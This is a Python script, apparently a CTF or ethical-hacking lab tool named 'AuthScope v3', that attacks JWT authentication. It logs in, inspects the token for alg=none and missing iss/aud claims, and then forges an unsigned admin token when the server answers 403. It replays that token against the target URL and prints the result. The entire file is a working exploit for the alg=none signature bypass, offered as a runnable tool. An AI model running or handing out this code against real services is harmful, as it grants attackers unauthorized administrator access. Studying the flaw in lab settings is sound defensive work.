#!/usr/bin/env python3
"""
AuthScope v3
CTF / CEH Lab Tool

Features:
- Auto-authenticate
- Detect JWT alg=none
- Automatically forge admin JWT
- Exploit admin endpoint
"""

import argparse
import requests
import json
import base64
import time
import sys

# --------------------
# Helpers
# --------------------

def b64url_encode(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def b64decode_nopad(data):
    data += "=" * (-len(data) % 4)
    return json.loads(base64.urlsafe_b64decode(data))

# --------------------
# JWT Logic
# --------------------

def analyze_jwt(token):
    parts = token.split(".")
    header = b64decode_nopad(parts[0])
    payload = b64decode_nopad(parts[1])

    notes = []
    if header.get("alg") == "none":
        notes.append("alg=none (UNSIGNED JWT)")

    if "iss" not in payload:
        notes.append("Missing iss")
    if "aud" not in payload:
        notes.append("Missing aud")

    return header, payload, notes

def forge_admin_jwt():
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "sub": 3,
        "username": "admin",
        "role": "admin",
        "iat": int(time.time())
    }
    return f"{b64url_encode(header)}.{b64url_encode(payload)}."

# --------------------
# Auth
# --------------------

def login(url, user, pw, unsigned):
    data = {"username": user, "password": pw}
    if unsigned:
        data["unsigned"] = True

    r = requests.post(url, json=data)
    if r.status_code != 200:
        print("[!] Login failed")
        sys.exit(1)

    return r.json()["token"]

# --------------------
# Main
# --------------------

def main():
    parser = argparse.ArgumentParser(description="AuthScope v3 — JWT Auto Exploit Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--auth-login", required=True, help="Login endpoint")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--unsigned", action="store_true", help="Request alg=none JWT")
    parser.add_argument("--auto-exploit", action="store_true", help="Auto forge admin JWT")

    args = parser.parse_args()

    print("[*] Logging in...")
    token = login(args.auth_login, args.username, args.password, args.unsigned)

    header, payload, notes = analyze_jwt(token)

    print("\n[+] JWT obtained")
    print("Header:", header)
    print("Payload:", payload)
    print("Notes:")
    for n in notes:
        print(" -", n)

    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(args.url, headers=headers)

    print(f"\n[*] Initial request → HTTP {r.status_code}")

    if r.status_code == 403 and args.auto_exploit:
        print("\n[!] Access denied — attempting JWT NONE exploit")

        forged = forge_admin_jwt()
        headers["Authorization"] = f"Bearer {forged}"

        r2 = requests.get(args.url, headers=headers)

        print("[+] Forged admin JWT used")
        print(f"[+] Exploit result → HTTP {r2.status_code}")

        print("\nResponse:")
        print(r2.text)

    elif r.status_code == 200:
        print("\n[+] Access granted")
        print(r.text)

    else:
        print("\n[-] Exploit not applicable")

if __name__ == "__main__":
    main()
